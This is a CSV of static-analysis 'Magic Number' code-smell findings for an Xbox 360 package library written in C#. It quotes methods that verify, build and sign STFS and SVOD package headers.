Implementation smell,Namespace,Class,File,Method,Description
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xHash = xIO.ReadBytes (20);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON: {  	// Verifies Certificate  	AddToLog ("Verifying Certificate");  	RSAParameters xRSAKeyz = new RSAParameters ();  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  	xIO.Position = 4;  	byte[] xCert = xIO.ReadBytes (0xA8);  	byte[] xSig = xIO.ReadBytes (0x100);  	xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  	xReturn.Add (VerifySignature (false));  	// Doesn't matter' same thing for CON  	xActive = false;  	return xReturn.ToArray ();  }  default: {  	xReturn.Add (VerifySignature (false));  	xReturn.Add (VerifySignature (true));  	xActive = false;  	return xReturn.ToArray ();  }  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON: {  	// Verifies Certificate  	AddToLog ("Verifying Certificate");  	RSAParameters xRSAKeyz = new RSAParameters ();  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  	xIO.Position = 4;  	byte[] xCert = xIO.ReadBytes (0xA8);  	byte[] xSig = xIO.ReadBytes (0x100);  	xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  	xReturn.Add (VerifySignature (false));  	// Doesn't matter' same thing for CON  	xActive = false;  	return xReturn.ToArray ();  }  default: {  	xReturn.Add (VerifySignature (false));  	xReturn.Add (VerifySignature (true));  	xActive = false;  	return xReturn.ToArray ();  }  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON: {  	// Verifies Certificate  	AddToLog ("Verifying Certificate");  	RSAParameters xRSAKeyz = new RSAParameters ();  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  	xIO.Position = 4;  	byte[] xCert = xIO.ReadBytes (0xA8);  	byte[] xSig = xIO.ReadBytes (0x100);  	xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  	xReturn.Add (VerifySignature (false));  	// Doesn't matter' same thing for CON  	xActive = false;  	return xReturn.ToArray ();  }  default: {  	xReturn.Add (VerifySignature (false));  	xReturn.Add (VerifySignature (true));  	xActive = false;  	return xReturn.ToArray ();  }  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xRSAKeyz.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xIO.Position = 4;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,MakeFile,The following statement contains a magic number: if (z == null) {  	if (xFileDirectory.Count + xFolderDirectory.Count + 1 >= 65535)  		return (xActive = false);  	return xAddFile (xIOIn' file' parent.FolderPointer);  }  else if (xType == AddType.Inject)  	return z.xInject (xIOIn);  else  	return z.xReplace (xIOIn);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,MakeFile,The following statement contains a magic number: if (xFileDirectory.Count + xFolderDirectory.Count + 1 >= 65535)  	return (xActive = false);  
Magic Number,X360.STFS,ThemeParams,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,ThemeParams,The following statement contains a magic number: AvatarLightingDirectional0 = (decimal)-0.5;  
Magic Number,X360.STFS,ThemeParams,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,ThemeParams,The following statement contains a magic number: AvatarLightingDirectional1 = (decimal)-0.6123;  
Magic Number,X360.STFS,CreateSTFS,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,AddFile,The following statement contains a magic number: if (UppedDirectCount >= 0x3FF || UppedTotalBlocks (CreateTools.BlockCount (FileLocation)) > BlockStep [2] || FilePath == null || FilePath == "")  	return false;  
Magic Number,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,The following statement contains a magic number: if (xboth) {  	FileEntry xacct = GetFile ("Account");  	if (xacct != null && xacct.Size == 404) {  		if (HasValidAccount)  			xUserFile.IO.Dispose ();  		AddToLog ("Parsing Account file");  		DJsIO xAcctIO = xacct.GetTempIO (true);  		if (xAcctIO == null || !xAcctIO.Accessed) {  			if (xAcctIO != null) {  				xAcctIO.Dispose ();  				VariousFunctions.DeleteFile (xAcctIO.FileNameLong);  			}  		}  		else {  			xUserFile = new UserAccount (xAcctIO' AccountType.Stock' true);  			xreturn = xUserFile.Success;  			if (!xUserFile.Success) {  				xUserFile = new UserAccount (xAcctIO' AccountType.Kits' true);  				xreturn = xUserFile.Success;  				if (!xUserFile.Success)  					xUserFile = null;  			}  		}  	}  }  
Magic Number,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,The following statement contains a magic number: if (xacct != null && xacct.Size == 404) {  	if (HasValidAccount)  		xUserFile.IO.Dispose ();  	AddToLog ("Parsing Account file");  	DJsIO xAcctIO = xacct.GetTempIO (true);  	if (xAcctIO == null || !xAcctIO.Accessed) {  		if (xAcctIO != null) {  			xAcctIO.Dispose ();  			VariousFunctions.DeleteFile (xAcctIO.FileNameLong);  		}  	}  	else {  		xUserFile = new UserAccount (xAcctIO' AccountType.Stock' true);  		xreturn = xUserFile.Success;  		if (!xUserFile.Success) {  			xUserFile = new UserAccount (xAcctIO' AccountType.Kits' true);  			xreturn = xUserFile.Success;  			if (!xUserFile.Success)  				xUserFile = null;  		}  	}  }  
Magic Number,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,XLoadCON,The following statement contains a magic number: xK.Exponent = xKV.ReadBytes (4);  
Magic Number,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The following statement contains a magic number: xK.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: try {  	string outlocale = OutLocation.Replace ('\\'' '/');  	if (outlocale [outlocale.Length - 1] == '/')  		outlocale = outlocale.Substring (0' outlocale.Length - 1);  	outlocale += '/' + ((uint)ContentType).ToString ("X8");  	string DataFolder = outlocale + "/" + xHeader.TitleID.ToString ("X8") + ".data";  	if (!VariousFunctions.xCheckDirectory (OutLocation))  		throw IOExcepts.CreateError;  	if (!VariousFunctions.xCheckDirectory (DataFolder))  		throw IOExcepts.CreateError;  	uint xBlockCount = 0;  	uint xDataFileCount = 0;  	long xDataLength = 0;  	BaseImage.xIO.Position = BaseImage.baseoffset;  	while (BaseImage.xIO.Position < BaseImage.xIO.Length) {  		if ((xBlockCount % Constants.SVODBL [1]) == 0) {  			if (x != null) {  				for (int i = 0; i < 0xCB; i++) {  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  					byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  					x.Write (Data1);  				}  				x.Flush ();  				xDataLength += x.Length;  				x.Close ();  			}  			x = new DJsIO (DataFolder + SVODFuncs.formatstring (xDataFileCount)' DJFileMode.Create' true);  			xDataFileCount++;  		}  		x.Position = SVODFuncs.GenerateDataOffset (xBlockCount);  		byte[] Data = BaseImage.xIO.ReadBytes (0x1000);  		x.Write (Data);  		x.Position = SVODFuncs.GenerateHashOffset (xBlockCount' 0);  		x.Write (SHA1Quick.ComputeHash (Data));  		xBlockCount++;  	}  	if (xBlockCount == 0) {  		x.Close ();  		return (xActive = false);  	}  	x.Flush ();  	xDataLength += x.Length;  	int lvlct = (int)((((xBlockCount % Constants.SVODBL [1]) - 1) / Constants.SVODBL [0]) + 1);  	for (int i = 0; i < lvlct; i++) {  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  		byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  		x.Write (Data1);  	}  	x.Flush ();  	x.Close ();  	byte[] Hash = null;  	for (int i = (int)(xDataFileCount - 1); i >= 0; i--) {  		x = new DJsIO (DataFolder + SVODFuncs.formatstring ((uint)i)' DJFileMode.Open' true);  		if (Hash != null) {  			x.Position = 0xFF0;  			x.Write (Hash);  			x.Flush ();  		}  		x.Position = 0;  		Hash = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  	}  	xHeader.DataFileSize = xDataLength;  	xHeader.DataFileCount = xDataFileCount;  	xHeader.xThisType = ContentType;  	h = new DJsIO (outlocale + "/" + xHeader.TitleID.ToString ("X8")' DJFileMode.Create' true);  	xHeader.Write (ref h);  	h.SetLength (0xB000);  	h.Position = 0x340;  	h.Write ((uint)0xAD0E);  	h.Position = 0x379;  	h.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	h.Write (Hash);  	h.Write ((byte)((Deviation == 0) ? 0 : 0x40));  	h.WriteUInt24 (xBlockCount);  	h.Write (Deviation' false);  	h.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (h.ReadBytes ((int)(h.Length - 0x344)));  	h.Position = 0x32C;  	h.Write (xHash);  	h.Flush ();  	h.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (h.ReadBytes (0x118));  	h.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		h.Write (xParams.Certificate);  		h.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		h.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		h.Write (new byte[0x128]);  	}  	h.IsBigEndian = true;  	h.Position = 0;  	h.Write (((uint)xParams.Type));  	xHeader.xMagic = xParams.Type;  	h.Flush ();  	h.Close ();  	return !(xActive = false);  }  catch {  	if (x != null)  		x.Close ();  	if (h != null)  		h.Close ();  	return (xActive = false);  }  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: try {  	string outlocale = OutLocation.Replace ('\\'' '/');  	if (outlocale [outlocale.Length - 1] == '/')  		outlocale = outlocale.Substring (0' outlocale.Length - 1);  	outlocale += '/' + ((uint)ContentType).ToString ("X8");  	string DataFolder = outlocale + "/" + xHeader.TitleID.ToString ("X8") + ".data";  	if (!VariousFunctions.xCheckDirectory (OutLocation))  		throw IOExcepts.CreateError;  	if (!VariousFunctions.xCheckDirectory (DataFolder))  		throw IOExcepts.CreateError;  	uint xBlockCount = 0;  	uint xDataFileCount = 0;  	long xDataLength = 0;  	BaseImage.xIO.Position = BaseImage.baseoffset;  	while (BaseImage.xIO.Position < BaseImage.xIO.Length) {  		if ((xBlockCount % Constants.SVODBL [1]) == 0) {  			if (x != null) {  				for (int i = 0; i < 0xCB; i++) {  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  					byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  					x.Write (Data1);  				}  				x.Flush ();  				xDataLength += x.Length;  				x.Close ();  			}  			x = new DJsIO (DataFolder + SVODFuncs.formatstring (xDataFileCount)' DJFileMode.Create' true);  			xDataFileCount++;  		}  		x.Position = SVODFuncs.GenerateDataOffset (xBlockCount);  		byte[] Data = BaseImage.xIO.ReadBytes (0x1000);  		x.Write (Data);  		x.Position = SVODFuncs.GenerateHashOffset (xBlockCount' 0);  		x.Write (SHA1Quick.ComputeHash (Data));  		xBlockCount++;  	}  	if (xBlockCount == 0) {  		x.Close ();  		return (xActive = false);  	}  	x.Flush ();  	xDataLength += x.Length;  	int lvlct = (int)((((xBlockCount % Constants.SVODBL [1]) - 1) / Constants.SVODBL [0]) + 1);  	for (int i = 0; i < lvlct; i++) {  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  		byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  		x.Write (Data1);  	}  	x.Flush ();  	x.Close ();  	byte[] Hash = null;  	for (int i = (int)(xDataFileCount - 1); i >= 0; i--) {  		x = new DJsIO (DataFolder + SVODFuncs.formatstring ((uint)i)' DJFileMode.Open' true);  		if (Hash != null) {  			x.Position = 0xFF0;  			x.Write (Hash);  			x.Flush ();  		}  		x.Position = 0;  		Hash = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  	}  	xHeader.DataFileSize = xDataLength;  	xHeader.DataFileCount = xDataFileCount;  	xHeader.xThisType = ContentType;  	h = new DJsIO (outlocale + "/" + xHeader.TitleID.ToString ("X8")' DJFileMode.Create' true);  	xHeader.Write (ref h);  	h.SetLength (0xB000);  	h.Position = 0x340;  	h.Write ((uint)0xAD0E);  	h.Position = 0x379;  	h.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	h.Write (Hash);  	h.Write ((byte)((Deviation == 0) ? 0 : 0x40));  	h.WriteUInt24 (xBlockCount);  	h.Write (Deviation' false);  	h.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (h.ReadBytes ((int)(h.Length - 0x344)));  	h.Position = 0x32C;  	h.Write (xHash);  	h.Flush ();  	h.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (h.ReadBytes (0x118));  	h.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		h.Write (xParams.Certificate);  		h.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		h.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		h.Write (new byte[0x128]);  	}  	h.IsBigEndian = true;  	h.Position = 0;  	h.Write (((uint)xParams.Type));  	xHeader.xMagic = xParams.Type;  	h.Flush ();  	h.Close ();  	return !(xActive = false);  }  catch {  	if (x != null)  		x.Close ();  	if (h != null)  		h.Close ();  	return (xActive = false);  }  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: try {  	string outlocale = OutLocation.Replace ('\\'' '/');  	if (outlocale [outlocale.Length - 1] == '/')  		outlocale = outlocale.Substring (0' outlocale.Length - 1);  	outlocale += '/' + ((uint)ContentType).ToString ("X8");  	string DataFolder = outlocale + "/" + xHeader.TitleID.ToString ("X8") + ".data";  	if (!VariousFunctions.xCheckDirectory (OutLocation))  		throw IOExcepts.CreateError;  	if (!VariousFunctions.xCheckDirectory (DataFolder))  		throw IOExcepts.CreateError;  	uint xBlockCount = 0;  	uint xDataFileCount = 0;  	long xDataLength = 0;  	BaseImage.xIO.Position = BaseImage.baseoffset;  	while (BaseImage.xIO.Position < BaseImage.xIO.Length) {  		if ((xBlockCount % Constants.SVODBL [1]) == 0) {  			if (x != null) {  				for (int i = 0; i < 0xCB; i++) {  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  					byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  					x.Write (Data1);  				}  				x.Flush ();  				xDataLength += x.Length;  				x.Close ();  			}  			x = new DJsIO (DataFolder + SVODFuncs.formatstring (xDataFileCount)' DJFileMode.Create' true);  			xDataFileCount++;  		}  		x.Position = SVODFuncs.GenerateDataOffset (xBlockCount);  		byte[] Data = BaseImage.xIO.ReadBytes (0x1000);  		x.Write (Data);  		x.Position = SVODFuncs.GenerateHashOffset (xBlockCount' 0);  		x.Write (SHA1Quick.ComputeHash (Data));  		xBlockCount++;  	}  	if (xBlockCount == 0) {  		x.Close ();  		return (xActive = false);  	}  	x.Flush ();  	xDataLength += x.Length;  	int lvlct = (int)((((xBlockCount % Constants.SVODBL [1]) - 1) / Constants.SVODBL [0]) + 1);  	for (int i = 0; i < lvlct; i++) {  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  		byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  		x.Write (Data1);  	}  	x.Flush ();  	x.Close ();  	byte[] Hash = null;  	for (int i = (int)(xDataFileCount - 1); i >= 0; i--) {  		x = new DJsIO (DataFolder + SVODFuncs.formatstring ((uint)i)' DJFileMode.Open' true);  		if (Hash != null) {  			x.Position = 0xFF0;  			x.Write (Hash);  			x.Flush ();  		}  		x.Position = 0;  		Hash = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  	}  	xHeader.DataFileSize = xDataLength;  	xHeader.DataFileCount = xDataFileCount;  	xHeader.xThisType = ContentType;  	h = new DJsIO (outlocale + "/" + xHeader.TitleID.ToString ("X8")' DJFileMode.Create' true);  	xHeader.Write (ref h);  	h.SetLength (0xB000);  	h.Position = 0x340;  	h.Write ((uint)0xAD0E);  	h.Position = 0x379;  	h.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	h.Write (Hash);  	h.Write ((byte)((Deviation == 0) ? 0 : 0x40));  	h.WriteUInt24 (xBlockCount);  	h.Write (Deviation' false);  	h.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (h.ReadBytes ((int)(h.Length - 0x344)));  	h.Position = 0x32C;  	h.Write (xHash);  	h.Flush ();  	h.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (h.ReadBytes (0x118));  	h.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		h.Write (xParams.Certificate);  		h.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		h.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		h.Write (new byte[0x128]);  	}  	h.IsBigEndian = true;  	h.Position = 0;  	h.Write (((uint)xParams.Type));  	xHeader.xMagic = xParams.Type;  	h.Flush ();  	h.Close ();  	return !(xActive = false);  }  catch {  	if (x != null)  		x.Close ();  	if (h != null)  		h.Close ();  	return (xActive = false);  }  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: h.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: h.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: h.Position = 4;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: if (xHeaderIO.ReadByte () != 0x24 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 0x11)  	return;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: if (xHeaderIO.ReadByte () != 0x24 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 0x11)  	return;  
